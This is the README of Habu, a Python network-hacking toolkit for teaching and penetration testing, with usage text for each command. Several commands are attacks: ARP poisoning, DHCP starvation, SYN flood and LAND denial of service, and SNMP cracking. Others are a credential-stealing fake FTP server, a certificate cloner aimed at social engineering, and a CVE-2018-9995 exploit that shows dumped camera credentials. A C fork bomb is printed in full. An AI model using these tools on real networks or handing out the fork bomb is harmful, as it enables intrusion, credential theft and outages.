# Habu: Python Network Hacking Toolkit

![image](logo.jpeg)

I'm developing Habu to teach (and learn) some concepts about Python and
Network Hacking.

These are basic functions that help with some tasks for Ethical Hacking
and Penetration Testing.

Most of them are related with networking, and the implementations are
intended to be understandable for who wants to read the source code and
learn from that.

Some techniques implemented in the current version are:

-   ARP Poisoning
-   ARP Sniffing
-   DHCP Discover
-   DHCP Starvation
-   Fake FTP Server
-   LAND Attack
-   SNMP Cracking
-   Subdomains Identification
-   SSL/TLS Certificate Cloner
-   SYN Flooding
-   TCP Flags Analysis
-   TCP ISN Analysis
-   TCP Port Scan
-   Username check on social networks
-   Virtual Hosts Identification
-   Web Techonologies Identification


## Usage Videos

The following Youtube Playlist has videos that shows the installation
and usage:

<https://www.youtube.com/watch?v=rgp9seLLyqE&list=PL4HZnX8VnFXqSvNw7x-bXOn0dgxNdfnVD>

## Telegram Group

If you want to discuss some Habu features, possible improvements, etc,
you can use the Habu Telegram Group: <https://t.me/python_habu>

Issues and pull requests must be sent to github repo:
<https://github.com/portantier/habu>

## Installation

**Kali Linux:**

You can install the package created for Kali Linux. See
<https://github.com/portantier/habu/releases>

**Python Package (PyPi):**

Habu is on PyPi, so you can install it directly with pip:

``` {.sourceCode .bash}
$ pip3 install habu
```

## Dependencies

Habu requires Python3 and the following packages:

- beautifulsoup4
- click
- cryptography
- lxml
- prompt\_toolkit
- pygments
- regex
- requests
- requests-cache
- scapy-python3
- websockets
- matplotlib (Optional, only needed if you want to make some graphs)

## Get Help

All the commands implement the option '--help', that shows the help,
arguments, options, and default values.

## Verbose Mode

Almost all commands implement the verbose mode with the '-v' option.
This can give you some extra info about what habu is doing.



## habu.arping


``` {.sourceCode .bash}
Usage: cmd_arping.py [OPTIONS] IP

  This command send ARP packets to check if a host it's alive in the local
  network.

  Example:

  # habu.arping 192.168.0.1
  Ether / ARP is at a4:08:f5:19:17:a4 says 192.168.0.1 / Padding

Options:
  -i TEXT  Interface to use
  -v       Verbose output
  --help   Show this message and exit.
```


## habu.arpoison


``` {.sourceCode .bash}
Usage: cmd_arpoison.py [OPTIONS] T1 T2

  This command sends ARP 'is-at' packets to each victim, poisoning their ARP
  tables for send the traffic to your system.

  Note: If you want a full working Man In The Middle attack, you need to
  enable the packet forwarding on your operating system to act like a
  router. You can do that using:

  # echo 1 > /proc/sys/net/ipv4/ip_forward

  Example:

  # habu.arpoison 192.168.0.1 192.168.0.77
  Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.77
  Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.70
  Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.77
  ...

Options:
  -i TEXT  Interface to use
  -v       Verbose
  --help   Show this message and exit.
```


## habu.arpsniff


``` {.sourceCode .bash}
Usage: cmd_arpsniff.py [OPTIONS]

  This command listen for ARP packets and shows information for each device.

  Columns: Seconds from last packet | IP | MAC | Vendor

  Example:

  1   192.168.0.1     a4:08:f5:19:17:a4   Sagemcom Broadband SAS
  7   192.168.0.2     64:bc:0c:33:e5:57   LG Electronics (Mobile Communications)
  2   192.168.0.5     00:c2:c6:30:2c:58   Intel Corporate
  6   192.168.0.7     54:f2:01:db:35:58   Samsung Electronics Co.,Ltd

Options:
  -i TEXT  Interface to use
  --help   Show this message and exit.
```


## habu.asydns


``` {.sourceCode .bash}
Usage: cmd_asydns.py [OPTIONS]

  This command requests DNS domain names based on public and private RSA
  keys using the AsyDNS protocol https://github.com/portantier/asydns>

  Example:

  $ habu.asydns -v
  Generating RSA key ...
  Loading RSA key ...
  {
      "ip": "181.31.41.231",
      "name": "07286e90fd6e7e6be61d6a7919967c7cf3bbfb23a36edbc72b6d7c53.a.asydns.org"
  }

  $ dig +short 07286e90fd6e7e6be61d6a7919967c7cf3bbfb23a36edbc72b6d7c53.a.asydns.org
  181.31.41.231

Options:
  -u TEXT  API URL
  -g       Force the generation of a new key pair
  -r       Revoke the public key
  -v       Verbose output
  --help   Show this message and exit.
```


## habu.b64


``` {.sourceCode .bash}
Usage: cmd_b64.py [OPTIONS] [F]

  This command encodes/decodes data in base64, just like the command base64.

  $ echo awesome | habu.b64
  YXdlc29tZQo=

  $ echo YXdlc29tZQo= | habu.b64 -d
  awesome

Options:
  -d      decode instead of encode
  --help  Show this message and exit.
```


## habu.certclone


``` {.sourceCode .bash}
Usage: cmd_certclone.py [OPTIONS] HOSTNAME PORT KEYFILE CERTFILE

  This command tries to connect to an SSL/TLS server, gets the certificate
  and generates a certificate with the same options and field values.

  Note: The generated certificate is invalid, but can be used for social
  engineering attacks

  Example:

  $ habu.certclone www.google.com 443 /tmp/key.pem /tmp/cert.pem

Options:
  --copy-extensions  Copy certificate extensions (default: False)
  --expired          Generate an expired certificate (default: False)
  -v                 Verbose
  --help             Show this message and exit.
```


## habu.contest


``` {.sourceCode .bash}
Usage: cmd_contest.py [OPTIONS]

  This command tries to connect to various services and check if you can
  reach them using your internet connection.

  Example:

  $ habu.contest
  IP:    True
  DNS:   True
  FTP:   True
  SSH:   True
  HTTP:  True
  HTTPS: True

Options:
  --help  Show this message and exit.
```


## habu.crack.luhn


``` {.sourceCode .bash}
Usage: cmd_crack_luhn.py [OPTIONS] NUMBER

  Luhn algorithm number cracker.

  You can pass an incomplete creditcard-like number and you will receive the
  valid number combinations based on all the posibilities that validates
  against the Luhn algorithm.

  Other numbers that use the Luhn algorithm for validation are IMEI numbers,
  National Provider Identifier numbers in the United States, Canadian Social
  Insurance Numbers, Israel ID Numbers and Greek Social Security Numbers
  (ΑΜΚΑ).

  The '-' characters are ignored.

  Define the missing numbers with the 'x' character.

  Reference: https://en.wikipedia.org/wiki/Luhn_algorithm

  Example:

  $ habu.crack.luhn 4509-xxxx-3160-6445

Options:
  --help  Show this message and exit.
```


## habu.crack.snmp


``` {.sourceCode .bash}
Usage: cmd_crack_snmp.py [OPTIONS] IP

  Launches snmp-get queries against an IP, and tells you when finds a valid
  community string (is a simple SNMP cracker).

  The dictionary used is the distributed with the onesixtyone tool
  https://github.com/trailofbits/onesixtyone

  Example:

  # habu.crack.snmp 179.125.234.210
  Community found: private
  Community found: public

  Note: You can also receive messages like \<UNIVERSAL\> \<class
  'scapy.asn1.asn1.ASN1\_Class\_metaclass'\>, I don't know how to supress
  them for now.

Options:
  -p INTEGER  Port to use
  -s          Stop after first match
  -v          Verbose
  --help      Show this message and exit.
```


## habu.ctfr


``` {.sourceCode .bash}
Usage: cmd_ctfr.py [OPTIONS] DOMAIN

  This command downloads the certificate transparency logs for a domain and
  check with DNS queries if each subdomain exists.

  Uses multithreading to improve the performance of the DNS queries.

  Example:

  $ sudo habu.ctrf securetia.com
  [
      "karma.securetia.com.",
      "www.securetia.com."
  ]

Options:
  -c      Disable cache
  -n      Disable DNS subdomain validation
  -v      Verbose output
  --help  Show this message and exit.
```


## habu.cve.2018.9995


``` {.sourceCode .bash}
Usage: cmd_cve_2018_9995.py [OPTIONS] IP

  This command exploits the CVE-2018-9995 and its based on the original code
  from Ezequiel Fernandez (@capitan_alfa).

  Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9995

  Example:

  $ python habu.cve.2018-9995 82.202.102.42
  [
      {
          "uid": "admin",
          "pwd": "securepassword",
          "role": 2,
          "enmac": 0,
          "mac": "00:00:00:00:00:00",
          "playback": 4294967295,
          "view": 4294967295,
          "rview": 4294967295,
          "ptz": 4294967295,
          "backup": 4294967295,
          "opt": 4294967295
      }
  ]

Options:
  -p INTEGER  Port to use (default: 80)
  -v          Verbose
  --help      Show this message and exit.
```


## habu.dhcp.discover


``` {.sourceCode .bash}
Usage: cmd_dhcp_discover.py [OPTIONS]

  This command sends a DHCP request and shows what devices has replied.

  Note: Using '-v' you can see all the options (like DNS servers) included
  on the responses.

  # habu.dhcp_discover
  Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.5:bootpc / BOOTP / DHCP

Options:
  -i TEXT     Interface to use
  -t INTEGER  Time (seconds) to wait for responses
  -v          Verbose output
  --help      Show this message and exit.
```


## habu.dhcp.starvation


``` {.sourceCode .bash}
Usage: cmd_dhcp_starvation.py [OPTIONS]

  This command send multiple DHCP requests from forged MAC addresses to fill
  the DHCP server leases.

  When all the available network addresses are assigned, the DHCP server
  don't send responses.

  So, some attacks, like DHCP spoofing can be made.

  # habu.dhcp_starvation
  Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.6:bootpc / BOOTP / DHCP
  Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.7:bootpc / BOOTP / DHCP
  Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.8:bootpc / BOOTP / DHCP

Options:
  -i TEXT     Interface to use
  -t INTEGER  Time (seconds) to wait for responses
  -s INTEGER  Time (seconds) between requests
  -v          Verbose output
  --help      Show this message and exit.
```


## habu.eicar


``` {.sourceCode .bash}
Usage: cmd_eicar.py [OPTIONS]

  This command prints the EICAR test string that can be used to test
  antimalware engines. More info: http://www.eicar.org/86-0-Intended-
  use.html

  Example:

  $ habu.eicar
  X5O!P%@AP[4\XZP54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

Options:
  --help  Show this message and exit.
```


## habu.extract.email


``` {.sourceCode .bash}
Usage: cmd_extract_email.py [OPTIONS] [INFILE]

  Extract email addresses from a file or stdin.

  Example:

  $ cat /var/log/auth.log | habu.extract.email
  john@securetia.com
  raven@acmecorp.net
  nmarks@fimax.com

Options:
  -v      Verbose output
  -j      JSON output
  --help  Show this message and exit.
```


## habu.extract.ipv4


``` {.sourceCode .bash}
Usage: cmd_extract_ipv4.py [OPTIONS] [INFILE]

  Extract IPv4 addresses from a file or stdin.

  Example:

  $ cat /var/log/auth.log | habu.extract.ipv4
  172.217.162.4
  23.52.213.96
  190.210.43.70

Options:
  --json  JSON output
  -v      Verbose output
  --help  Show this message and exit.
```


## habu.forkbomb


``` {.sourceCode .bash}
Usage: cmd_forkbomb.py [OPTIONS] BOMB

  A shortcut to remember how to use fork bombs in different languages.

  Currently supported: bash, batch, c, haskell, perl, php, python, ruby.

  Example:

  #include <unistd.h>
  int main()
  {
      while(1)
      {
          fork();
      }
      return 0;
  }

Options:
  --help  Show this message and exit.
```


## habu.hasher


``` {.sourceCode .bash}
Usage: cmd_hasher.py [OPTIONS] [F]

  This command computes various hashes for the input data, that can be a
  file or a stream.

  Example:

  $ habu.hasher README.rst
  md5         : e5828c564f71fea3a12dde8bd5d27063
  ripemd160   : ef6886c3b68cb34a44f9ca9336f3cd0732600a84
  sha1        : 7bae8076a5771865123be7112468b79e9d78a640
  sha512      : 65cfb1cf719b851b4aea5a7f5388068687b1fdfd290817a...
  whirlpool   : eaccf718b31d8a01f76fc08e896a6d0d73dbeafc2621fe0...

  You can also specify which algorithm to use. In such case, the output is
  only the value of the calculated hash:

  $ habu.hasher -a md5 README.rst
  e5828c564f71fea3a12dde8bd5d27063

Options:
  -a [md5|sha1|sha512|ripemd160|whirlpool]
                                  Only this algorithm (Default: all)
  --help                          Show this message and exit.
```


## habu.ip2asn


``` {.sourceCode .bash}
Usage: cmd_ip2asn.py [OPTIONS] IP

  Uses Team Cymru ip2asn service to get information about a public
  IPv4/IPv6.

  $ habu.ip2asn 8.8.8.8
  {
      "asn": "15169",
      "net": "8.8.8.0/24",
      "cc": "US",
      "rir": "ARIN",
      "asname": "GOOGLE - Google LLC, US",
      "country": "United States"
  }

Options:
  --help  Show this message and exit.
```


## habu.ip


``` {.sourceCode .bash}
```


## habu.isn


``` {.sourceCode .bash}
Usage: cmd_isn.py [OPTIONS] IP

  This command creates TCP connections and prints the TCP initial sequence
  numbers for each connections.

  $ sudo habu.isn -c 5 www.portantier.com
  1962287220
  1800895007
  589617930
  3393793979
  469428558

  Note: You can get a graphical representation (needs the matplotlib
  package) using the '-g' option to better understand the randomness.

Options:
  -p INTEGER  Port to use (default: 80)
  -c INTEGER  How many packets to send/receive (default: 5)
  -i TEXT     Interface to use
  -g          Graph (requires matplotlib)
  -v          Verbose output
  --help      Show this message and exit.
```


## habu.jshell


``` {.sourceCode .bash}
Usage: cmd_jshell.py [OPTIONS]

Options:
  -v          Verbose
  -i TEXT     IP to listen on
  -p INTEGER  Port to listen on
  --help      Show this message and exit.
```


## habu.karma


``` {.sourceCode .bash}
Usage: cmd_karma.py [OPTIONS] HOST

  Uses the Karma service https://karma.securetia.com to check an IP against
  a lot of Threat Intelligence / Reputation lists.

  $ habu.karma www.google.com
  www.google.com -> 64.233.190.99
  [
      "hphosts_fsa",
      "hphosts_psh",
      "hphosts_emd"
  ]

  Note: You can use the hostname or the IP of the host to query.

Options:
  --help  Show this message and exit.
```


## habu.land


``` {.sourceCode .bash}
Usage: cmd_land.py [OPTIONS] IP

  This command implements the LAND attack, that sends packets forging the
  source IP address to be the same that the destination IP. Also uses the
  same source and destination port.

  The attack is very old, and can be used to make a Denial of Service on old
  systems, like Windows NT 4.0. More information here:
  https://en.wikipedia.org/wiki/LAND

  $ sudo habu.land 172.16.0.10
  ............

  Note: Each dot (.) is a sent packet. You can specify how many packets send
  with the '-c' option. The default is never stop. Also, you can specify the
  destination port, with the '-p' option.

Options:
  -c INTEGER  How many packets send (default: infinit)
  -p INTEGER  Port to use (default: 135)
  -i TEXT     Interface to use
  -v          Verbose
  --help      Show this message and exit.
```


## habu.nc


``` {.sourceCode .bash}
Usage: cmd_nc.py [OPTIONS] HOST PORT

  This command is some kind of netcat/ncat replacement.

  The execution emulates the feeling of this popular tools.

  Example:

  $ habu.nc --crlf www.portantier.com 80
  Connected to 45.77.113.133 80
  HEAD / HTTP/1.0

  HTTP/1.0 301 Moved Permanently
  Date: Thu, 26 Jul 2018 21:10:51 GMT
  Server: OpenBSD httpd
  Connection: close
  Content-Type: text/html
  Content-Length: 443
  Location: https://www.portantier.com/

Options:
  --family [4|6|46]            IP Address Family
  --ssl                        Enable SSL
  --crlf                       Use CRLF for EOL sequence
  --protocol [tcp|udp]         Layer 4 protocol to use
  --source-ip TEXT             Source IP to use
  --source-port INTEGER RANGE  Source port to use
  --help                       Show this message and exit.
```


## habu.ping


``` {.sourceCode .bash}
Usage: cmd_ping.py [OPTIONS] IP

  This command implements the classic 'ping' with ICMP echo requests.

  # habu.ping 8.8.8.8
  IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
  IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
  IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
  IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding

Options:
  -i TEXT     Wich interface to use (default: auto)
  -c INTEGER  How many packets send (default: infinit)
  -t INTEGER  Timeout in seconds (default: 2)
  -w INTEGER  How many seconds between packets (default: 1)
  -v          Verbose
  --help      Show this message and exit.
```


## habu.protoscan


``` {.sourceCode .bash}
Usage: cmd_protoscan.py [OPTIONS] IP

  Send IP packets with different protocol field content to guess what layer
  4 protocols are available.

  The output shows which protocols doesn't generate a 'protocol-unreachable'
  ICMP response.

  Example:

  $ sudo python cmd_ipscan.py 45.77.113.133
  1   icmp
  2   igmp
  4   ipencap
  6   tcp
  17  udp
  41  ipv6
  47  gre
  50  esp
  51  ah
  58  ipv6_icmp
  97  etherip
  112 vrrp
  115 l2tp
  132 sctp
  137 mpls_in_ip

Options:
  -i TEXT     Interface to use
  -t INTEGER  Timeout for each probe (default: 2 seconds)
  --all       Probe all protocols (default: Defined in /etc/protocols)
  -v          Verbose output
  --help      Show this message and exit.
```


## habu.server.ftp


``` {.sourceCode .bash}
Usage: cmd_server_ftp.py [OPTIONS]

  This command implements a basic fake FTP server, whith the only purpose to
  steal user credentials.

  The server supports SSL/TLS.

  Example:

  # sudo habu.server.ftp --ssl --ssl-cert /tmp/cert.pem --ssl-key /tmp/key.pem
  Listening on port 21
  Accepted connection from ('192.168.0.27', 56832)
  Credentials collected from 192.168.0.27! fabian 123456

Options:
  -a TEXT          Address to bind (default: all)
  -p INTEGER       Which port to use (default: 21)
  --ssl            Enable SSL/TLS (default: False)
  --ssl-cert TEXT  SSL/TLS Cert file
  --ssl-key TEXT   SSL/TLS Key file
  -v               Verbose
  --help           Show this message and exit.
```


## habu.shodan


``` {.sourceCode .bash}
Usage: cmd_shodan.py [OPTIONS] IP

  Simple shodan API client with prints the json result of a shodan query

  Example:

  $ habu.shodan 8.8.8.8
  {
      "hostnames": [
          "google-public-dns-a.google.com"
      ],
      "country_code": "US",
      "org": "Google",
      "data": [
          {
              "isp": "Google",
              "transport": "udp",
              "data": "Recursion: enabled",
              "asn": "AS15169",
              "port": 53,
              "hostnames": [
                  "google-public-dns-a.google.com"
              ]
          }
      ],
      "ports": [
          53
      ]
  }

Options:
  -c           Disable cache
  -v           Verbose output
  -o FILENAME  Output file (default: stdout)
  --help       Show this message and exit.
```


## habu.synflood


``` {.sourceCode .bash}
Usage: cmd_synflood.py [OPTIONS] IP

  This command launches a lot of TCP connections and keeps them opened. Some
  very old systems can suffer a Denial of Service with this. More info:
  https://en.wikipedia.org/wiki/SYN_flood

  Example:

  # sudo habu.synflood 172.16.0.10
  .................

  Each dot is a packet sent.

  You can use the options '-2' and '-3' to forge the layer 2/3 addresses.

  If you use them, each connection will be sent from a random layer2 (MAC)
  and/or layer3 (IP) address.

  You can choose the number of connections to create with the option '-c'.
  The default is never stop creating connections.

  Note: If you send the packets from your real IP address and you want to
  keep the connections half-open, you need to setup for firewall to don't
  send the RST packets.

Options:
  -i TEXT     Wich interface to use (default: auto)
  -c INTEGER  How many packets send (default: infinit)
  -p INTEGER  Port to use (default: 135)
  -2          Forge layer2/MAC address (default: No)
  -3          Forge layer3/IP address (default: No)
  -v          Verbose
  --help      Show this message and exit.
```


## habu.tcpflags


``` {.sourceCode .bash}
Usage: cmd_tcpflags.py [OPTIONS] IP

  This command send TCP packets with different flags and tell you what
  responses receives.

  It can be used to analyze how the different TCP/IP stack implementations
  and configurations responds to packet with various flag combinations.

  Example:

  # habu.tcpflags www.portantier.com
  S  -> SA
  FS -> SA
  FA -> R
  SA -> R

  By default, the command sends all possible flag combinations. You can
  specify which flags must ever be present (reducing the quantity of
  possible combinations), with the option '-f'.

  Also, you can specify which flags you want to be present on the response
  packets to show, with the option '-r'.

  With the next command, you see all the possible combinations that have the
  FIN (F) flag set and generates a response that contains the RST (R) flag.

  Example:

  # habu.tcpflags -f F -r R www.portantier.com
  FPA  -> R
  FSPA -> R
  FAU  -> R

Options:
  -p INTEGER  Port to use (default: 80)
  -f TEXT     Flags that must be sent ever (default: fuzz with all flags)
  -r TEXT     Filter by response flags (default: show all responses)
  -v          Verbose
  --help      Show this message and exit.
```


## habu.tcpscan


``` {.sourceCode .bash}
Usage: cmd_tcpscan.py [OPTIONS] IP

  TCP Port Scanner.

  Prints the ports that generated a response with the SYN flag or (if show
  use -a) all the ports that generated a response.

  It's really basic compared with nmap, but who is comparing?

  Example:

  # habu.tcpscan -p 22,23,80,443 -s 1 45.77.113.133
  22 S -> SA
  80 S -> SA
  443 S -> SA

Options:
  -p TEXT     Ports to use (default: 80) example: 20-23,80,135
  -i TEXT     Interface to use
  -f TEXT     Flags to use (default: S)
  -s TEXT     Time between probes (default: send all together)
  -t INTEGER  Timeout for each probe (default: 2 seconds)
  -a          Show all responses (default: Only containing SYN flag)
  -v          Verbose output
  --help      Show this message and exit.
```


## habu.traceroute


``` {.sourceCode .bash}
Usage: cmd_traceroute.py [OPTIONS] IP

  TCP traceroute.

  Identify one of the paths to a destination.

  Example:

  # habu.traceroute 45.77.113.133
  IP / ICMP 192.168.0.1 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror
  IP / ICMP 10.242.4.197 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror / Padding
  IP / ICMP 200.32.127.98 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror / Padding
  .
  IP / ICMP 4.16.180.190 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror
  .
  IP / TCP 45.77.113.133:http > 192.168.0.5:ftp_data SA / Padding

  Note: It's better if you use a port that is open on the remote system.

Options:
  -p INTEGER  Port to use (default: 80)
  -i TEXT     Interface to use
  --help      Show this message and exit.
```


## habu.usercheck


``` {.sourceCode .bash}
Usage: cmd_usercheck.py [OPTIONS] USERNAME

  Check if the given username exists on various social networks and other
  popular sites.

  $ habu.usercheck portantier
  {
      "aboutme": "https://about.me/portantier",
      "disqus": "https://disqus.com/by/portantier/",
      "github": "https://github.com/portantier/",
      "ifttt": "https://ifttt.com/p/portantier",
      "lastfm": "https://www.last.fm/user/portantier",
      "medium": "https://medium.com/@portantier",
      "pastebin": "https://pastebin.com/u/portantier",
      "pinterest": "https://in.pinterest.com/portantier/",
      "twitter": "https://twitter.com/portantier",
      "vimeo": "https://vimeo.com/portantier"
  }

Options:
  -c      Disable cache
  -v      Verbose output
  -w      Open each valid url in a webbrowser
  --help  Show this message and exit.
```


## habu.vhosts


``` {.sourceCode .bash}
Usage: cmd_vhosts.py [OPTIONS] HOST

  Use Bing to query the websites hosted on the same IP address.

  $ habu.vhosts www.telefonica.com
  www.telefonica.com -> 212.170.36.79
  [
      'www.telefonica.es',
      'universitas.telefonica.com',
      'www.telefonica.com',
  ]

Options:
  -c          Disable cache
  -p INTEGER  Pages count (Default: 10)
  -f INTEGER  First result to get (Default: 1)
  --help      Show this message and exit.
```


## habu.virustotal


``` {.sourceCode .bash}
Usage: cmd_virustotal.py [OPTIONS] INPUT

  Send a file to VirusTotal https://www.virustotal.com/ and print the report
  in JSON format.

  Note: Before send a file, habu will check if the file has been analyzed
  before (sending the sha256 of the file to VirusTotal), if a report exists,
  no submission will be made, and you will see the last report.

  $ habu.virustotal meterpreter.exe
  Verifying if hash already submitted: f4826b219aed3ffdaa23db26cfae611979bf215984fc71a1c12f6397900cb70d
  Sending file for analysis
  Waiting/retrieving the report...
  {
      "md5": "0ddb015b5328eb4d0cc2b87c39c49686",
      "permalink": "https://www.virustotal.com/file/c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23/analysis/1526850717/",
      "positives": 49,
      "resource": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23",
      "response_code": 1,
      "scan_date": "2018-05-20 21:11:57",
      "scan_id": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23-1526850717",
      "scans": {
          "ALYac": {
              "detected": true,
              "result": "Trojan.CryptZ.Gen",
              "update": "20180520",
              "version": "1.1.1.5"
          },
          ... The other scanners ...
      },
      "sha1": "5fa33cab1729480dd023b08f7b91a945c16d0a9e",
      "sha256": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23",
      "total": 67,
      "verbose_msg": "Scan finished, information embedded"
  }

Options:
  -v      Verbose output
  --help  Show this message and exit.
```


## habu.webid


``` {.sourceCode .bash}
Usage: cmd_webid.py [OPTIONS] URL

  Use Wappalyzer apps.json database to identify technologies used on a web
  application.

  More info about Wappalyzer: <https://github.com/AliasIO/Wappalyzer/>

  Note: This tool only sends one request. So, it's stealth and not
  suspicious.

  $ habu.webid https://woocomerce.com
  {
      "Nginx": {
          "categories": [
              "Web Servers"
          ]
      },
      "PHP": {
          "categories": [
              "Programming Languages"
          ]
      },
      "WooCommerce": {
          "categories": [
              "Ecommerce"
          ],
          "version": "6.3.1"
      },
      "WordPress": {
          "categories": [
              "CMS",
              "Blogs"
          ]
      },
  }

Options:
  -c      Disable cache
  -v      Verbose output
  --help  Show this message and exit.
```


## habu.xor


``` {.sourceCode .bash}
Usage: cmd_xor.py [OPTIONS]

  XOR cipher

  Note: XOR is not a 'secure cipher'. If you need strong crypto you must use
  algorithms like AES.

  Example:

  $ habu.xor -k mysecretkey -i /bin/ls > xored
  $ habu.xor -k mysecretkey -i xored > uxored
  $ sha1sum /bin/ls uxored
  $ 6fcf930fcee1395a1c95f87dd38413e02deff4bb  /bin/ls
  $ 6fcf930fcee1395a1c95f87dd38413e02deff4bb  uxored

Options:
  -k TEXT      Encryption key
  -i FILENAME  Input file
  -o FILENAME  Output file
  --help       Show this message and exit.
```
